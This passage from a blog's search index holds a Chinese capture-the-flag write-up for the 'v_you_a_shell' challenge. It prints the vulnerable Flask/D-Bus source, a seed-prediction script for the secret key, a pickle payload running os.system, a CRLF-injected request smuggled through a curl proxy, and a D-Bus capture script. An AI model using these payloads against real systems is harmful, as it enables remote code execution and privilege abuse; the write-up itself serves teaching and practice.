        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>强网杯-2023-wp</title>
    <url>/2023/12/25/%E5%BC%BA%E7%BD%91%E6%9D%AF-2023-wp/</url>
    <content><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
  </entry>
  <entry>
    <title>矩阵杯v_you_a_shell</title>
    <url>/2024/06/02/%E7%9F%A9%E9%98%B5%E6%9D%AFv-you-a-shell/</url>
    <content><![CDATA[<h1 id="v-you-a-shell"><a href="#v-you-a-shell" class="headerlink" title="v_you_a_shell"></a>v_you_a_shell</h1><span id="more"></span>
<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>首先通过php读取到了两个python服务，<code>/app/app.py</code>,<code>/app/flagService.py</code>，然后通过读取 <code>/start.sh</code>，找到了dbus的配置文件<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> dbus</span><br><span class="line"><span class="keyword">import</span> dbus.service</span><br><span class="line"><span class="keyword">import</span> dbus.mainloop.glib</span><br><span class="line"><span class="keyword">from</span> gi.repository <span class="keyword">import</span> GLib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secretKey = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setSecretKet</span>():</span><br><span class="line">    <span class="keyword">global</span> secretKey</span><br><span class="line">    secretKey = hashlib.md5(random.randbytes(<span class="number">16</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setSecretKet()</span><br><span class="line">app.secret_key = secretKey</span><br><span class="line">loginList = &#123;&#125;</span><br><span class="line">login_fail_times = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyDBusService</span>(dbus.service.Object):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, bus_name, object_path</span>):</span><br><span class="line">        dbus.service.Object.__init__(self, bus_name, object_path)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @dbus.service.method(<span class="params"><span class="string">&quot;ctf.syncServer&quot;</span>, in_signature=<span class="string">&#x27;&#x27;</span>, out_signature=<span class="string">&#x27;s&#x27;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ping</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pong&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @dbus.service.method(<span class="params"><span class="string">&quot;ctf.syncServer&quot;</span>, in_signature=<span class="string">&#x27;ss&#x27;</span>, out_signature=<span class="string">&#x27;s&#x27;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">self, username, key</span>):</span><br><span class="line">        <span class="keyword">global</span> secretKey</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> loginList <span class="keyword">and</span> key == secretKey:</span><br><span class="line">            data = pickle.loads(base64.b64decode(loginList[username]))</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;keyError&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">global</span> loginList</span><br><span class="line">    <span class="keyword">global</span> login_fail_times</span><br><span class="line">    <span class="keyword">if</span> login_fail_times == <span class="number">5</span>:</span><br><span class="line">        login_fail_times = <span class="number">0</span></span><br><span class="line">        session[<span class="string">&#x27;code&#x27;</span>] = hashlib.md5(random.randbytes(<span class="number">16</span>)).hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">        setSecretKet()</span><br><span class="line">    username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    data = request.cookies.get(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> code != session[<span class="string">&#x27;code&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;codeError&quot;</span></span><br><span class="line">    <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span> <span class="keyword">and</span> password == <span class="string">&quot;123456&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> data != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            loginList[username] = data</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            loginList[username] = <span class="string">&quot;no&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login successful&quot;</span></span><br><span class="line">    login_fail_times += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Password error&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/getCode&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getCode</span>():</span><br><span class="line">    random.seed(<span class="built_in">int</span>(time.time() * <span class="number">10</span>))</span><br><span class="line">    session[<span class="string">&#x27;code&#x27;</span>] = hashlib.md5(random.randbytes(<span class="number">16</span>)).hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> session[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbusServerStart</span>():</span><br><span class="line">    dbus.mainloop.glib.DBusGMainLoop(set_as_default=<span class="literal">True</span>)</span><br><span class="line">    bus = dbus.SystemBus()</span><br><span class="line">    bus_name = dbus.service.BusName(<span class="string">&quot;ctf.syncServer&quot;</span>, bus)</span><br><span class="line">    service = MyDBusService(bus_name, <span class="string">&quot;/ctf/syncServer&quot;</span>)</span><br><span class="line">    loop = GLib.MainLoop()</span><br><span class="line">    loop.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    threading.Thread(target=dbusServerStart).start()</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flagService.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> dbus, time</span><br><span class="line"><span class="keyword">import</span> dbus.service</span><br><span class="line"><span class="keyword">import</span> dbus.mainloop.glib</span><br><span class="line"><span class="keyword">from</span> gi.repository <span class="keyword">import</span> GLib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FlagService</span>(dbus.service.Object):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, bus_name, object_path</span>):</span><br><span class="line">        dbus.service.Object.__init__(self, bus_name, object_path)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @dbus.service.method(<span class="params"><span class="string">&quot;ctf.flag.service&quot;</span>, in_signature=<span class="string">&#x27;&#x27;</span>, out_signature=<span class="string">&#x27;s&#x27;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ping</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pong&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @dbus.service.method(<span class="params"><span class="string">&quot;ctf.flag.service&quot;</span>, in_signature=<span class="string">&#x27;s&#x27;</span>, out_signature=<span class="string">&#x27;s&#x27;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getTime</span>(<span class="params">self, <span class="built_in">format</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">__import__</span>(<span class="string">&quot;json&quot;</span>).dumps(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">1</span>, <span class="string">&quot;time&quot;</span>: time.strftime(<span class="built_in">format</span>, time.localtime())&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dbus.mainloop.glib.DBusGMainLoop(set_as_default=<span class="literal">True</span>)</span><br><span class="line">bus = dbus.SystemBus()</span><br><span class="line">bus_name = dbus.service.BusName(<span class="string">&quot;ctf.flag.service&quot;</span>, bus)</span><br><span class="line">service = FlagService(bus_name, <span class="string">&quot;/ctf/flag/service&quot;</span>)</span><br><span class="line">loop = GLib.MainLoop()</span><br><span class="line">loop.run()</span><br></pre></td></tr></table></figure></p>
<h2 id="预测secretkey，设置反序列化数据"><a href="#预测secretkey，设置反序列化数据" class="headerlink" title="预测secretkey，设置反序列化数据"></a>预测secretkey，设置反序列化数据</h2><p>可以看到 <code>/getCode</code> 路由以当前时间设置了随机数，并且返回了随机数的前4位，并且在 <code>/login</code> 中<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> login_fail_times == <span class="number">5</span>:</span><br><span class="line">    login_fail_times = <span class="number">0</span></span><br><span class="line">    session[<span class="string">&#x27;code&#x27;</span>] = hashlib.md5(random.randbytes(<span class="number">16</span>)).hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    setSecretKet()</span><br></pre></td></tr></table></figure><br>当失败次数达到5次，会重新设置随机数和session。<br>那么利用链如下，以下给出post数据包<br>通过php去访问 <code>/getCode</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=curl&amp;url=http%3A%2F%2F127.0.0.1%3A8080%2FgetCode&amp;method=GET</span><br></pre></td></tr></table></figure><br>得到session和key，拿到key，用以下的脚本去预测<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># 已知的MD5哈希值的前四位</span></span><br><span class="line">known_md5_prefix = <span class="string">&quot;3061&quot;</span>  <span class="comment"># 示例值，替换为你已知的前四位值</span></span><br><span class="line">a=<span class="built_in">int</span>(time.time() * <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b=a-<span class="number">28800</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="comment"># 起始种子值</span></span><br><span class="line">start_seed = b</span><br><span class="line">           <span class="comment">#17172611574</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_md5_prefix</span>(<span class="params">seed</span>):</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    rand_bytes = random.randbytes(<span class="number">16</span>)</span><br><span class="line">    md5_hash = hashlib.md5(rand_bytes).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> md5_hash[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_seed</span>(<span class="params">start_seed, known_md5_prefix</span>):</span><br><span class="line">    current_seed = start_seed</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        md5_prefix = generate_md5_prefix(current_seed)</span><br><span class="line">        <span class="keyword">if</span> md5_prefix == known_md5_prefix:</span><br><span class="line">            <span class="keyword">return</span> current_seed</span><br><span class="line">        current_seed += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行爆破</span></span><br><span class="line">found_seed = find_seed(start_seed, known_md5_prefix)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Found seed: <span class="subst">&#123;found_seed&#125;</span>&quot;</span>)</span><br><span class="line">random.seed(found_seed)</span><br><span class="line">code = hashlib.md5(random.randbytes(<span class="number">16</span>)).hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">code = hashlib.md5(random.randbytes(<span class="number">16</span>)).hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">key = hashlib.md5(random.randbytes(<span class="number">16</span>)).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(code)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>最后的key就是secretkey，因为有时差，所以需要减去28800</p>
</blockquote>
<p>拿到key和cookie以后保存成一个正常的数据包，然后通过php的method参数注入数据包(因为需要注入cookie)，data是反序列化数据<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># data.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64,random,hashlib,time</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># command=r&#x27;echo &quot;import os\\ndef dumps(a):\\n\\tos.system(\&quot;touch /tmp/aaa &amp;&amp; chmod 777 /flag\&quot;)&quot; &gt; /app/json.py 2&gt;&amp;1&#x27;</span></span><br><span class="line">        command = <span class="string">r&#x27;which dbus-send &gt; /tmp/a&#x27;</span></span><br><span class="line">        <span class="comment"># command = r&#x27;ls /bin &gt; /tmp/a&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line"> </span><br><span class="line">p=Person()</span><br><span class="line">opcode=pickle.dumps(p)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(opcode))</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=curl&amp;method=GET%20/login%3Fusername%3Dadmin%26password%3D123456%26code%3Dbeb3%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A8080%0D%0ACookie%3A%20session%3DeyJjb2RlIjoiYmViMyJ9.ZluEVA.boOh1u9A19w52LCwRIl8-BiYJkc%3Bdata%3DgASVLQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBJkYnVzLXNlbmQgPiAvdG1wL2GUhZRSlC4%3D%3B&amp;url=http://127.0.0.1:8080/login?username=admin&amp;password=123456&amp;data=username</span><br></pre></td></tr></table></figure><br>然后把密码输错5次，之后就可以重置了secretkey</p>
<h2 id="dbus协议分析"><a href="#dbus协议分析" class="headerlink" title="dbus协议分析"></a>dbus协议分析</h2><p>因为dbus底层也是socket，可以通过一个脚本给他改成可以抓成pcap包<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   UNIX域Socket抓包</span></span><br><span class="line"><span class="comment">#   </span></span><br><span class="line"><span class="comment">#   作者：RToax</span></span><br><span class="line"><span class="comment">#   时间：2020年11月9日</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"> </span><br><span class="line">exe_name=<span class="variable">$0</span></span><br><span class="line">eth_port=<span class="string">&quot;lo&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#UNIX socket 文件路径</span></span><br><span class="line">unix_path=/tmp/unix.sock</span><br><span class="line">unix_path_original=<span class="string">&quot;<span class="variable">$unix_path</span>.original&quot;</span></span><br><span class="line">ARG_UNIX_PATH=<span class="string">&quot;-u&quot;</span></span><br><span class="line">ARG_UNIX_PATH_S=<span class="string">&quot;UNIX socket path name.&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#抓包文件</span></span><br><span class="line">pcap_switch=0</span><br><span class="line">pcap_file=pcap.pcap</span><br><span class="line">ARG_PCAP_FILE=<span class="string">&quot;-f&quot;</span></span><br><span class="line">ARG_PCAP_FILE_S=<span class="string">&quot;Pcap File Name. default <span class="variable">$pcap_file</span>, no set no save.&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#临时端口</span></span><br><span class="line">tcp_port=8087</span><br><span class="line">ARG_TCP_PORT=<span class="string">&quot;-p&quot;</span></span><br><span class="line">ARG_TCP_PORT_S=<span class="string">&quot;TMP port for swap UNIX socket. default <span class="variable">$tcp_port</span>&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#显示包的比特信息，如下：</span></span><br><span class="line"><span class="comment"># 0x0000:  4500 0034 52ae 4000 4006 ea13 7f00 0001</span></span><br><span class="line"><span class="comment"># 0x0010:  7f00 0001 c82a 07cf 6a88 73d9 bfa9 666c</span></span><br><span class="line"><span class="comment"># 0x0020:  8010 01f8 fe28 0000 0101 080a a2d6 9545</span></span><br><span class="line"><span class="comment"># 0x0030:  a2d6 9545</span></span><br><span class="line">pbits_flag=0</span><br><span class="line">ARG_PBITS_DETAIL=<span class="string">&quot;-x&quot;</span></span><br><span class="line">ARG_PBITS_DETAIL_S=<span class="string">&quot;Show Packet Bits.&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#帮助信息</span></span><br><span class="line">ARG_USAGE=<span class="string">&quot;-h&quot;</span></span><br><span class="line">ARG_USAGE_S=<span class="string">&quot;Show usage.&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#tcpdump的参数</span></span><br><span class="line">ARG_TCPDUMP=<span class="string">&quot; -i <span class="variable">$eth_port</span> -netvvv -N -q &quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">usage</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;<span class="variable">$exe_name</span> [option] [value]\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;    <span class="variable">$ARG_UNIX_PATH</span>   <span class="variable">$ARG_UNIX_PATH_S</span> \n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;    <span class="variable">$ARG_PCAP_FILE</span>   <span class="variable">$ARG_PCAP_FILE_S</span>\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;    <span class="variable">$ARG_TCP_PORT</span>   <span class="variable">$ARG_TCP_PORT_S</span>\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;    <span class="variable">$ARG_PBITS_DETAIL</span>   <span class="variable">$ARG_PBITS_DETAIL_S</span>\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;    <span class="variable">$ARG_USAGE</span>   <span class="variable">$ARG_USAGE_S</span>\n&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">parse_args</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    argvs=($(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span>))</span><br><span class="line">    elements=$[ <span class="variable">$#</span> - 1 ]</span><br><span class="line">    <span class="keyword">for</span> (( i = 0; i &lt;= <span class="variable">$elements</span>; i++ ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment"># 解析抓包文件参数</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$&#123;argvs[$i]&#125;</span> = <span class="variable">$ARG_USAGE</span> ]; <span class="keyword">then</span></span><br><span class="line">            usage</span><br><span class="line">            <span class="built_in">return</span> 1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        <span class="comment"># 解析UNIXsocket路径参数</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$&#123;argvs[$i]&#125;</span> = <span class="variable">$ARG_UNIX_PATH</span> ]; <span class="keyword">then</span></span><br><span class="line">            unix_path=<span class="variable">$&#123;argvs[<span class="variable">$&#123;i&#125;</span>+1]&#125;</span></span><br><span class="line">            <span class="comment">#文件必须存在</span></span><br><span class="line">            <span class="keyword">if</span> [ ! -e <span class="variable">$unix_path</span> ]; <span class="keyword">then</span> </span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;Unix Path not exist. <span class="variable">$unix_path</span>\n&quot;</span></span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;TYPE&gt;&gt; <span class="variable">$exe_name</span> <span class="variable">$ARG_USAGE</span> for help.\n&quot;</span></span><br><span class="line">                <span class="built_in">return</span> 1</span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">            <span class="comment">#文件必须为Socket类型</span></span><br><span class="line">            <span class="keyword">if</span> [ ! -S <span class="variable">$unix_path</span> ]; <span class="keyword">then</span> </span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;File must be Unix Socket Path. <span class="variable">$unix_path</span>\n&quot;</span></span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;TYPE&gt;&gt; <span class="variable">$exe_name</span> <span class="variable">$ARG_USAGE</span> for help.\n&quot;</span></span><br><span class="line">                <span class="built_in">return</span> 1</span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        <span class="comment"># 解析抓包文件参数</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$&#123;argvs[$i]&#125;</span> = <span class="variable">$ARG_PCAP_FILE</span> ]; <span class="keyword">then</span></span><br><span class="line">            pcap_file=<span class="variable">$&#123;argvs[<span class="variable">$&#123;i&#125;</span>+1]&#125;</span></span><br><span class="line">            pcap_switch=1</span><br><span class="line">            <span class="keyword">if</span> [ -e <span class="variable">$pcap_file</span> ]; <span class="keyword">then</span> </span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;PCAP file: <span class="variable">$pcap_file</span> exist, overwrite it.\n&quot;</span></span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;TYPE&gt;&gt; <span class="variable">$exe_name</span> <span class="variable">$ARG_USAGE</span> for help.\n&quot;</span></span><br><span class="line">                <span class="built_in">rm</span> -f <span class="variable">$pcap_file</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 显示包的比特信息</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$&#123;argvs[$i]&#125;</span> = <span class="variable">$ARG_PBITS_DETAIL</span> ]; <span class="keyword">then</span></span><br><span class="line">            pbits_flag=1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        <span class="comment"># 解析临时端口参数</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$&#123;argvs[$i]&#125;</span> = <span class="variable">$ARG_TCP_PORT</span> ]; <span class="keyword">then</span></span><br><span class="line">            tcp_port=<span class="variable">$&#123;argvs[<span class="variable">$&#123;i&#125;</span>+1]&#125;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> 0</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> [ ! -e  /usr/bin/socat ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;Not socat found, install socat first.\n&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">if</span> [ ! -e  /usr/sbin/tcpdump ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;Not tcpdump found, install tcpdump first.\n&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#没有参数直接退出</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -lt 1 ]; <span class="keyword">then</span> </span><br><span class="line">    usage</span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#解析参数</span></span><br><span class="line">parse_args $*</span><br><span class="line"> </span><br><span class="line"><span class="comment">#参数解析失败，直接退出</span></span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">unix_path_original=<span class="string">&quot;<span class="variable">$unix_path</span>.original&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Move socket files</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&quot;<span class="variable">$&#123;unix_path&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;unix_path_original&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;&#123; rm &#x27;<span class="variable">$&#123;unix_path&#125;</span>&#x27;; mv &#x27;<span class="variable">$&#123;unix_path_original&#125;</span>&#x27; &#x27;<span class="variable">$&#123;unix_path&#125;</span>&#x27;; &#125;&quot;</span> EXIT</span><br><span class="line"> </span><br><span class="line"><span class="comment">#创建一个TCP监听，一个UNIXSocket监听</span></span><br><span class="line">socat -t100 <span class="string">&quot;TCP-LISTEN:<span class="variable">$&#123;tcp_port&#125;</span>,reuseaddr,fork&quot;</span> <span class="string">&quot;UNIX-CONNECT:<span class="variable">$&#123;unix_path_original&#125;</span>&quot;</span> &amp;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#创建一个UNIX监听和一个TCP监听</span></span><br><span class="line">socat -t100 <span class="string">&quot;UNIX-LISTEN:<span class="variable">$&#123;unix_path&#125;</span>,mode=777,reuseaddr,fork&quot;</span> <span class="string">&quot;TCP:localhost:<span class="variable">$&#123;tcp_port&#125;</span>&quot;</span> &amp;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#ARG_TCPDUMP=&quot; -i $eth_port -netvvv &quot;</span></span><br><span class="line"><span class="comment">#端口过滤</span></span><br><span class="line">ARG_TCPDUMP=<span class="variable">$ARG_TCPDUMP</span><span class="string">&quot; port <span class="variable">$tcp_port</span> &quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#是否输出抓包文件</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$pcap_switch</span> = <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    ARG_TCPDUMP=<span class="variable">$ARG_TCPDUMP</span><span class="string">&quot; -w <span class="variable">$&#123;pcap_file&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$pbits_flag</span> = <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    ARG_TCPDUMP=<span class="variable">$ARG_TCPDUMP</span><span class="string">&quot; -x&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#保存抓包数据  -i lo -netvvv -x port $tcpport -w &quot;$&#123;pcapfile&#125;&quot;</span></span><br><span class="line">tcpdump <span class="variable">$ARG_TCPDUMP</span></span><br></pre></td></tr></table></figure><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./undump.sh -u /run/dbus/system_bus_socket -f a.pcap</span><br></pre></td></tr></table></figure><br>他这边开始抓包的时候，通过 <code>dbus-send</code> 发送数据包，具体命令是（我这里忽略测试ping路由的过程）</p>
<blockquote>
<p>测试的时候只能运行第一次python，不能关了开第二次，会影响数据包中的sender</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dbus-send --system --type=method_call --print-reply --dest=ctf.syncServer /ctf/syncServer ctf.syncServer.backdoor string:&quot;admin&quot; string:&quot;secretkey&quot;</span><br></pre></td></tr></table></figure>
